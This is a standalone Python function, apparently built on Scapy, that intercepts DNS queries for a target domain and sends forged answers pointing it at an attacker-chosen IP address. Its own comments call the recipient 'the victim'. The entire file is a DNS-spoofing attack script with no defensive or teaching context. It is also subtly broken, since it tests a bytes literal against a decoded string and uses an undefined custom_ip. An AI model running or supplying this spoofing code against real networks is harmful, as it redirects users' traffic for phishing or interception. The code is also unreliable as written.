def spoof_dns(pkt):
    """Spoof DNS responses for DNS queries."""
    if pkt.haslayer(DNSQR):  # DNS Query Record
        qname = pkt[DNSQR].qname.decode()

        # Check for the domain you want to spoof
        if b"example.com" in qname:  
            print(f"[+] Spoofing DNS request for {qname}")

            # Create the DNS response
            dns_response = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                DNS(
                    id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
                    an=DNSRR(rrname=qname, ttl=60, rdata=custom_ip),  # Spoofed response
                    ns=DNSRR(rrname=qname, ttl=60, rdata=custom_ip),  # Authority section
                )
            )

            # Send the spoofed DNS response to the victim
            send(dns_response, verbose=False)
            print(f"[+] Sent spoofed DNS response with IP {custom_ip} for {qname}")

